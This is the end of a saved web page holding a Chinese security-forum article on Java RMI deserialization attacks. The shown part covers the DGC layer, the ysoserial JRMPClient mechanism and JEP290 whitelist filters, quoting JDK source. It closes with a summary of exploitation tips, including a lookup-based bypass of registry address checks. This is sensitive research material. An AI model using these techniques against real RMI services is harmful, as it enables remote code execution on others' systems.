+ <span class="o">}</span>
+
+<span class="cm">/* get the remote object */</span>
+<span class="c1">//该dgcID是一个常量，此处进行了验证</span>
+<span class="n">Transport</span> <span class="n">transport</span> <span class="o">=</span> <span class="n">id</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">dgcID</span><span class="o">)</span> <span class="o">?</span> <span class="kc">null</span> <span class="o">:</span> <span class="k">this</span><span class="o">;</span>
+<span class="c1">//根据读取出来的id里面的[0，0，0]（三个都是我们序列化写入的值）分别是：</span>
+<span class="c1">//1.服务端uid给客户端的远程对象唯一标识编号</span>
+<span class="c1">//2.远程对象有效时长用的时间戳</span>
+<span class="c1">//3.用于同一时间申请的统一远程对象的另一个用于区分的随机数</span>
+<span class="c1">//服务端去查询这三个值的hash，判断当前DGC客户端有没有服务端的远程对象</span>
+<span class="c1">//就是dirty，clean那一套东西</span>
+<span class="n">Target</span> <span class="n">target</span> <span class="o">=</span>
+<span class="n">ObjectTable</span><span class="o">.</span><span class="na">getTarget</span><span class="o">(</span><span class="k">new</span> <span class="n">ObjectEndpoint</span><span class="o">(</span><span class="n">id</span><span class="o">,</span> <span class="n">transport</span><span class="o">));</span>
+
+<span class="k">if</span> <span class="o">(</span><span class="n">target</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">(</span><span class="n">impl</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="na">getImpl</span><span class="o">())</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+<span class="k">throw</span> <span class="k">new</span> <span class="n">NoSuchObjectException</span><span class="o">(</span><span class="s">"no such object in table"</span><span class="o">);</span>
+<span class="o">}</span>
+</pre></div>
+<p>dgcID：</p>
+<div class="highlight"><pre><span></span><span class="c1">//dgcID位置sun.rmi.transport.Transport</span>
+<span class="cm">/** ObjID for DGCImpl */</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">ObjID</span> <span class="n">dgcID</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjID</span><span class="o">(</span><span class="n">ObjID</span><span class="o">.</span><span class="na">DGC_ID</span><span class="o">);</span>
+<span class="c1">//ObjID.DGC_ID位置：java.rmi.server.ObjID</span>
+     <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">DGC_ID</span> <span class="o">=</span> <span class="mi">2</span><span class="o">;</span>
+</pre></div>
+<p>而这里的2之后的三个0，我们因为攻击服务端，没有去服务端获取过远程对象所以都写成0即可，不然会报错。</p>
+<p>至此DGC层的原理分析以及Ysoserial exploit JRMPClient模块原理分析就完成了。仔细分析自主构建的POC之后会发现这种看着小齿轮完美切合的感觉，相当美感。</p>
+<h3 id="toc-16">JEP290修复</h3>
+<p>在JEP290规范之后，即JAVA版本6u141, 7u131, 8u121之后，以上攻击就不奏效了。</p>
+<p><a id="img35" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140501-4ee640d2-b44e-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140501-4ee640d2-b44e-1.png"></a></p>
+<p>同样被白名单过滤了，<code>sun.rmi.transport.DGCImpl#checkInput</code>过滤器：</p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="n">Status</span> <span class="nf">checkInput</span><span class="o">(</span><span class="n">FilterInfo</span> <span class="n">var0</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">//与`sun.rmi.registry.RegistryImpl#registryFilter`处过滤器完全一致</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">dgcFilter</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">Status</span> <span class="n">var1</span> <span class="o">=</span> <span class="n">dgcFilter</span><span class="o">.</span><span class="na">checkInput</span><span class="o">(</span><span class="n">var0</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">var1</span> <span class="o">!=</span> <span class="n">Status</span><span class="o">.</span><span class="na">UNDECIDED</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="n">var1</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+
+        <span class="k">if</span> <span class="o">(</span><span class="n">var0</span><span class="o">.</span><span class="na">depth</span><span class="o">()</span> <span class="o">&gt;</span> <span class="o">(</span><span class="kt">long</span><span class="o">)</span><span class="n">DGC_MAX_DEPTH</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">Status</span><span class="o">.</span><span class="na">REJECTED</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="n">Class</span> <span class="n">var2</span> <span class="o">=</span> <span class="n">var0</span><span class="o">.</span><span class="na">serialClass</span><span class="o">();</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">var2</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="n">Status</span><span class="o">.</span><span class="na">UNDECIDED</span><span class="o">;</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="k">while</span><span class="o">(</span><span class="n">var2</span><span class="o">.</span><span class="na">isArray</span><span class="o">())</span> <span class="o">{</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">var0</span><span class="o">.</span><span class="na">arrayLength</span><span class="o">()</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="n">L</span> <span class="o">&amp;&amp;</span> <span class="n">var0</span><span class="o">.</span><span class="na">arrayLength</span><span class="o">()</span> <span class="o">&gt;</span> <span class="o">(</span><span class="kt">long</span><span class="o">)</span><span class="n">DGC_MAX_ARRAY_SIZE</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="k">return</span> <span class="n">Status</span><span class="o">.</span><span class="na">REJECTED</span><span class="o">;</span>
+                    <span class="o">}</span>
+
+                    <span class="n">var2</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getComponentType</span><span class="o">();</span>
+                <span class="o">}</span>
+
+                <span class="k">if</span> <span class="o">(</span><span class="n">var2</span><span class="o">.</span><span class="na">isPrimitive</span><span class="o">())</span> <span class="o">{</span>
+                    <span class="k">return</span> <span class="n">Status</span><span class="o">.</span><span class="na">ALLOWED</span><span class="o">;</span>
+                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                    <span class="c1">//4种白名单限制</span>
+                    <span class="k">return</span> <span class="n">var2</span> <span class="o">!=</span> <span class="n">ObjID</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span>
+                        <span class="n">var2</span> <span class="o">!=</span> <span class="n">UID</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span>
+                        <span class="n">var2</span> <span class="o">!=</span> <span class="n">VMID</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span>
+                        <span class="n">var2</span> <span class="o">!=</span> <span class="n">Lease</span><span class="o">.</span><span class="na">class</span> <span class="o">?</span> <span class="n">Status</span><span class="o">.</span><span class="na">REJECTED</span> <span class="o">:</span> <span class="n">Status</span><span class="o">.</span><span class="na">ALLOWED</span><span class="o">;</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<h2 id="toc-17">为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制</h2>
+<p>那是因为JEP290提供了一些系列过滤器形式：进程级过滤器、自定义过滤器、内置过滤器。但是默认只为<strong>RMI注册表</strong>和<strong>RMI分布式垃圾收集器</strong>提供了相应的内置过滤器。这两个过滤器都配置为白名单，即只允许反序列化特定类。（就像我们上面看到的一样）</p>
+<p>但是RMI客户端利用参数反序列化攻击没有也不能跟<strong>RMI注册表</strong>和<strong>RMI分布式垃圾收集器</strong>一样使用内置白名单过滤器。使用了，全给你白名单拦截了，我还怎么序列化传输参数数据，参数数据我甚至要自定义一个类，咋可能在你这小小的白名单中？</p>
+<p>这就是安全性与实际使用场景相冲突导致的，已知的但是迫不得已无法修复的漏洞。</p>
+<h2 id="toc-18">小结</h2>
+<p>探测利用开放的RMI服务：</p>
+<ol>
+<li>实际上就是蒙，赌它有这些漏洞RMI服务。</li>
+</ol>
+<p>RMI客户端反序列化攻击RMI服务端：</p>
+<ol>
+<li>不一定是要Object类型的接口才行，只要不是基本类型的参数都可以利用。</li>
+</ol>
+<p>RMI服务端反序列化攻击RMI注册端：</p>
+<ol>
+<li>RMI服务端利用bind攻击注册端的时候，找各种办法把payload变成remote接口这个举动是非必须的，注册端反序列化触发压根不校验。只是为了exp实现而已。</li>
+<li>在将payload变成remote接口的过程中，利用到动态代理，但是压根没有利用到动态代理的"拦截器特性"，只是利用了动态代理可以将任意对象转化接口形式的特性。</li>
+<li>在8u141之后，在利用bind等服务端对于注册端发起的操作时，会因为注册端对于服务端有地址验证而失效。</li>
+<li>利用lookup操作，作为客户端对于注册端发起请求，可以绕过上面的地址验证。</li>
+</ol>
+<h2 id="toc-19">参考</h2>
+<p>参考统一放在下篇中</p>
+
+            </div>
+            
+
+            <div class="post-user-action" style="margin-top: 34px;">
+                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="7930">
+                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">17</span>
+                </span>
+                
+                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="7930">
+                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">9</span>
+                    </span>
+                
+                <div class="clearfix"></div>
+            </div>
+            
+                <div class="related-section">
+                    <div class="related-box">
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/7931" title="极致CMS两处漏洞复现/存储xss/文件上传Getshell"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>极致CMS两处漏洞复现/存储xss...</a></span>
+                        
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/7942" title="sqlmap --os-shell原理"><span class="related-label" style="">下一篇：</span>sqlmap --os-shell原理</a></span>
+                        
+                    </div>
+                </div>
+            
+        </div>
+    </div>
+</div>
+
+    <!-- topic & appendix -->
+    
+
+
+
+<div class="row box">
+    <ol class="breadcrumb">
+        <li class="active">3 条回复</li>
+    </ol>
+    <div class="box-container post-container">
+        
+            
+                <ul class="post-info" id="reply-14685">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/default_avatar.png">
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xz.aliyun.com/u/5023">A0xpge</a>
+                                
+                                <span class="bbs-time">2020-07-01 10:28:42</span>
+
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p>关注 收藏  Star Fork ,一键四连</p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="14685" data-topic="7930"><i class="fa fa-thumbs-o-up"></i><span>1</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="A0xpge">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+                <ul class="post-info" id="reply-14686">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/13027_a12c4d03c463ffaaae.png">
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xz.aliyun.com/u/13027">我怎么这么帅</a>
+                                
+                                <span class="bbs-time">2020-07-01 10:46:09</span>
+
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p>老哥发文 顶顶顶~</p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="14686" data-topic="7930"><i class="fa fa-thumbs-o-up"></i><span>1</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="我怎么这么帅">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+                <ul class="post-info" id="reply-16306">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/default_avatar.png">
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xz.aliyun.com/u/29798">何止</a>
+                                
+                                <span class="bbs-time">2021-03-06 19:20:40</span>
+
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p>太强了牛逼</p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="16306" data-topic="7930"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="何止">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+        
+    </div>
+</div>
+
+
+    <!-- posts of topic -->
+    
+        <div class="row box" id="reply-box">
+            
+            <div class="box-container clearfix">
+                
+                    <div class="reminder">
+                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7930&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
+                    </div>
+                
+            </div>
+        </div>
+    
+    <!-- editor for post -->
+    
+
+        </div>
+        <div class="span3 pull-right offset sidebar">
+            
+
+
+    <div class="box">
+        <div class="info-panel">
+            <p><strong>先知社区</strong></p>
+            <hr>
+            <p class="text-center login-btn">
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7930&amp;from_type=xianzhi" class="btn">现在登录</a>
+            </p>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice">
+            <div class="info-body">
+                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
+            </div>
+        </div>
+    </div>
+
+
+<div class="box">
+    <div class="global-charts">
+        <div id="chart-header">
+            <div class="col-sm-4 text-center charts" data-type="year">
+                年度贡献榜
+            </div>
+            <div class="text-center charts active" data-type="month">
+                月度贡献榜
+            </div>
+            <div class="clearfix"></div>
+        </div>
+        <div id="chart_body">
+            <div class="info-body" data-type="year">
+
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/19809_81cdc44b3d98558e6a.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/19809" title="Stars">Stars</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">5</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/21686" title="Ainrm">Ainrm</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">4</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/36574_e3fbd332c6c45e2014.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/36574" title="lyy">lyy</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/4830" title="藏青">藏青</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/29994" title="crow">crow</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">2</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+            </div>
+            <div class="info-body" data-type="month">
+                
+                    <div class="member">
+                        <p class="text-center">暂无排行</p>
+                    </div>
+                
+            </div>
+        </div>
+
+    </div>
+</div>
+
+    <div class="box sfixed" id="toc-container" style="width: 190px;">
+        <div class="panel-info">
+            <div class="panel-heading">
+                <h4>目录</h4>
+            </div>
+            <div id="toc">
+                <div class="high-light" style="display: block; background-color: rgb(243, 243, 243); position: absolute; height: 26px; top: 440px;"></div>
+            <ol style="top: 50px;"><li><a href="https://xz.aliyun.com/t/7930#toc-0">前言</a></li><li><a href="https://xz.aliyun.com/t/7930#toc-1">回顾稚嫩的过去</a></li><li><a href="https://xz.aliyun.com/t/7930#toc-2">探测利用开放的RMI服务</a><ol><li><a href="https://xz.aliyun.com/t/7930#toc-3">BaRMIe</a></li><li><a href="https://xz.aliyun.com/t/7930#toc-4">看看探测利用开放的RMI服务的攻击模块是怎么实现的</a></li></ol></li><li><a href="https://xz.aliyun.com/t/7930#toc-5">RMI客户端反序列化攻击RMI服务端</a><ol><li><a href="https://xz.aliyun.com/t/7930#toc-6">利用Object类型参数</a></li><li><a href="https://xz.aliyun.com/t/7930#toc-7">绕过Object类型参数</a></li></ol></li><li><a href="https://xz.aliyun.com/t/7930#toc-8">RMI服务端反序列化攻击RMI注册端</a><ol><li><a href="https://xz.aliyun.com/t/7930#toc-9">Barmie - Bind</a></li><li><a href="https://xz.aliyun.com/t/7930#toc-10">Ysoserial-RMIRegistryExploit - Bind</a></li><li><a href="https://xz.aliyun.com/t/7930#toc-11">RMIattack - Bind + 回显</a></li><li><a href="https://xz.aliyun.com/t/7930#toc-12">JEP290修复</a></li><li><a href="https://xz.aliyun.com/t/7930#toc-13">注册端对于服务端地址校验的变动</a></li></ol></li><li><a href="https://xz.aliyun.com/t/7930#toc-14">RMI DGC层反序列化</a><ol><li><a href="https://xz.aliyun.com/t/7930#toc-15">DGC客户端打DGC服务端</a></li><li><a href="https://xz.aliyun.com/t/7930#toc-16">JEP290修复</a></li></ol></li><li><a href="https://xz.aliyun.com/t/7930#toc-17">为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制</a></li><li><a href="https://xz.aliyun.com/t/7930#toc-18">小结</a></li><li><a href="https://xz.aliyun.com/t/7930#toc-19">参考</a></li></ol></div>
+        </div>
+    </div>
+    <div style="clear: both;"></div>
+
+
+    <script type="text/javascript">
+        $(function () {
+            $(".charts").click(switchChart)
+
+            function switchChart() {
+                let _this = $(this);
+                let idx = _this.attr("data-type")
+                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
+                if (!_this.hasClass("active")) {
+                    _this.addClass("active").siblings().removeClass("active")
+                    content.show().siblings().hide()
+                }
+            }
+        })
+    </script>
+
+
+    <style>
+
+    </style>
+
+        </div>
+    </div>
+
+
+</div>
+<footer class="bs-docs-footer">
+    <div class="container text-center">
+        <div class="links">
+            <a href="https://xz.aliyun.com/feed" target="_blank">RSS</a>
+            <a href="https://xz.aliyun.com/protocol" target="_blank"><span>免责声明</span></a>
+            <a href="https://xz.aliyun.com/partner" target="_blank"><span>友情链接</span></a>
+            <a href="https://xz.aliyun.com/notice">社区小黑板</a>
+        </div>
+    </div>
+</footer>
+
+<script src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/bootstrap.min.js.下载"></script>
+<script src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/xz.js.下载"></script>
+
+
+    
+    <script type="text/javascript">
+        $(document).ready(function () {
+            voteUp = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/up/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7930&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-up').html(data.html);
+                                }
+                            }
+                        }
+                    });
+                }
+            };
+            voteDown = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/down/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7930&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-down').html(data.html);
+                                }
+                            }
+
+                        }
+                    });
+                }
+            };
+            
+        });
+    </script>
+
+
+    <script src="https://s11.cnzz.com/z_stat.php?id=1260716569&amp;web_id=1260716569"></script>
+
+
+<div id="waf_nc_block" style="display: none;"><div class="waf-nc-mask"></div><div id="WAF_NC_WRAPPER" class="waf-nc-wrapper"><img class="waf-nc-icon" src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/robot.png" alt="" height="111" width="150"><p class="waf-nc-description">为保证您的正常访问，请进行如下验证：</p><div id="nocaptcha"></div></div></div></body></html>
